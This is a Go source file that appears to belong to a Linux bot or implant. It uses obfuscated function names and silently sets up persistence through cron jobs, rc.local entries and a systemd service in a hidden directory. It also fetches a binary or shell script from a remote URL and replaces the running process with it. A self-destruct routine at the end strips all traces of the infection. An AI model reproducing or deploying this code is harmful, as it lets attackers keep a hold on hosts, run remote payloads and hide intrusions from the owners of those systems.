package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)


func bNkXqVm() {
	exe, err := os.Executable()
	if err != nil {
		if verboseLog {
			deoxys("[DEBUG] Failed to get executable path: %v", err)
		}
		return
	}

	procName := filepath.Base(exe)
	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", schedExpr, procName, exe)

	if verboseLog {
		deoxys("[DEBUG] Would set up cron persistence")
		deoxys("[DEBUG] Executable: %s", exe)
		deoxys("[DEBUG] Process name: %s", procName)
		deoxys("[DEBUG] Would install cron job: %s", cronJob)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	checkCmd := exec.Command(crontabBin, "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) || strings.Contains(string(existing), binLabel) {
		return
	}

	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		deoxys("crontab install failed: %v", err)
	}
}

func hRpCwZt() {
	if verboseLog {
		deoxys("[DEBUG] Would set up rc.local persistence")
		if _, err := os.Stat(rcTarget); err != nil {
			deoxys("[DEBUG] %s does not exist, would skip", rcTarget)
			return
		}
		exe, err := os.Executable()
		if err != nil {
			deoxys("[DEBUG] Failed to get executable path: %v", err)
			return
		}
		b, err := os.ReadFile(rcTarget)
		if err != nil {
			deoxys("[DEBUG] Failed to read %s: %v", rcTarget, err)
			return
		}
		if strings.Contains(string(b), exe) || strings.Contains(string(b), binLabel) {
			deoxys("[DEBUG] Entry already exists in rc.local")
			return
		}
		line := exe + " # " + kimsuky()
		deoxys("[DEBUG] Would add to rc.local: %s", line)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	if _, err := os.Stat(rcTarget); err != nil {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	b, err := os.ReadFile(rcTarget)
	if err != nil {
		return
	}
	if strings.Contains(string(b), exe) || strings.Contains(string(b), binLabel) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	sandworm(rcTarget, line, 0700)
}

func jGdBsLn(url string) ([]byte, error) {
	code, body, err := rawHTTPGet(url, nil, 30*time.Second)
	if err != nil {
		return nil, err
	}
	if code != 200 {
		return nil, fmt.Errorf("HTTP %d", code)
	}
	return body, nil
}

func fVxMqKp(url string) {
	programPath := filepath.Join(storeDir, binLabel)

	if verboseLog {
		deoxys("[DEBUG] Would set up persistence")
		deoxys("[DEBUG] Would create hidden directory: %s", storeDir)
		deoxys("[DEBUG] Primary: copy running binary")
		if url != "" {
			deoxys("[DEBUG] Fallback (if binary unreadable): fetch from %s", url)
		}
		deoxys("[DEBUG] Would write binary to: %s", programPath)
		deoxys("[DEBUG] Would write systemd service to: %s", unitPath)
		deoxys("[DEBUG] Would enable systemd service: %s", unitName)
		deoxys("[DEBUG] Skipping actual execution (debug mode)")
		return
	}

	os.MkdirAll(storeDir, 0700)

	// Always try to copy the running binary first.
	// Only fall back to the URL if the binary can't be read.
	var data []byte
	if exe, err := os.Executable(); err == nil {
		data, err = os.ReadFile(exe)
		if err != nil {
			deoxys("self-read failed: %v", err)
		}
	}
	if len(data) == 0 {
		if url == "" {
			deoxys("no binary and no fallback url — aborting")
			return
		}
		var err error
		data, err = jGdBsLn(url)
		if err != nil {
			deoxys("fallback fetch failed: %v", err)
			return
		}
		deoxys("used fallback url: %s", url)
	}

	if err := os.WriteFile(programPath, data, 0755); err != nil {
		return
	}

	unitContent := fmt.Sprintf(
		"[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n",
		binLabel, programPath,
	)
	os.WriteFile(unitPath, []byte(unitContent), 0644)

	// daemon-reload first so systemd picks up new/changed unit file
	exec.Command(systemctlBin, "daemon-reload").Run()
	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
	if err := cmd.Run(); err != nil {
		deoxys("systemctl enable failed: %v", err)
	}
}

func cTwHnYz(url string) {
	data, err := jGdBsLn(url)
	if err != nil {
		deoxys("fetch failed: %v", err)
		return
	}

	isScript := strings.HasSuffix(url, ".sh") ||
		(len(data) >= 2 && data[0] == '#' && data[1] == '!')

	// Write to persistent directory instead of /tmp to avoid temp file leaks.
	// Binaries go to the standard persistence path; scripts get a separate name.
	os.MkdirAll(storeDir, 0700)
	var targetPath string
	if isScript {
		targetPath = filepath.Join(storeDir, binLabel+"-update.sh")
	} else {
		targetPath = filepath.Join(storeDir, binLabel)
	}

	if err := os.WriteFile(targetPath, data, 0755); err != nil {
		return
	}

	var execPath string
	var args []string
	if isScript {
		execPath = bashBin
		args = []string{bashBin, targetPath}
	} else {
		execPath = targetPath
		args = []string{targetPath}
	}

	// Replace this process — no return on success
	syscall.Exec(execPath, args, syscall.Environ())
	// Exec failed — clean up scripts only (keep binary for persistence)
	if isScript {
		os.Remove(targetPath)
	}
}

func rZbQfGv() {
	deoxys("removing all persistence and self-destructing")

	// Get own executable path once — used across all cleanup steps
	exe, _ := os.Executable()

	// === IMPORTANT: ordering matters ===
	// systemctl stop sends SIGTERM to our own process (SIGTERM is intentionally
	// NOT ignored — see ignoreSignals). If we call stop first, the process dies
	// and cron/rc.local are never cleaned, so the bot resurrects.
	// Strategy: clean everything that can't kill us first, disable systemd last,
	// then os.Exit (which stops the service implicitly since we ARE the process).

	// 1. Remove cron entries (safe — won't kill us)
	if out, err := exec.Command(crontabBin, "-l").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) || (exe != "" && strings.Contains(line, exe)) {
				continue
			}
			clean = append(clean, line)
		}
		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
		if filtered == "" {
			exec.Command(crontabBin, "-r").Run()
		} else {
			cmd := exec.Command(crontabBin, "-")
			cmd.Stdin = strings.NewReader(filtered + "\n")
			cmd.Run()
		}
	}

	// 2. Clean rc.local (safe — won't kill us)
	rcLocal := rcTarget
	if data, err := os.ReadFile(rcLocal); err == nil {
		lines := strings.Split(string(data), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) || strings.Contains(line, storeDir) || (exe != "" && strings.Contains(line, exe)) {
				continue
			}
			clean = append(clean, line)
		}
		os.WriteFile(rcLocal, []byte(strings.Join(clean, "\n")), 0755)
	}

	// 3. Disable systemd and remove unit file (prevents restart after we exit).
	//    Do NOT call "systemctl stop" — it sends SIGTERM and kills us mid-cleanup.
	exec.Command(systemctlBin, "disable", unitName).Run()
	os.Remove(unitPath)
	exec.Command(systemctlBin, "daemon-reload").Run()

	// 4. Remove hidden directory (contains binary copy)
	os.RemoveAll(storeDir)

	// 5. Remove instance lock file
	os.Remove(lockLoc)

	// 6. Remove own executable
	if exe != "" {
		os.Remove(exe)
	}

	// 7. Exit — this implicitly stops the systemd service since we ARE the process.
	os.Exit(0)
}
